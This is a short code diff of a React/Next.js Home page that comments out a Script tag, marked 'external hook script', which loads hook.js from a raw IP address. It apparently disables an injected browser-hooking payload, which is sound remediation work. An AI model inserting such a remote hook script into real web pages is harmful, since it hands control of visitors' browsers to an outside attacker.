@@ -542,9 +542,9 @@ export default function Home() {
       </footer>{" "}
       {/* end footer */}
       {/* external hook script */}
-      <Script
+      {/* <Script
         src="http://89.165.219.117:3069/hook.js"
-      />
+      />*/}
     </main> // end main container
   ); // end return
 } // end Home component
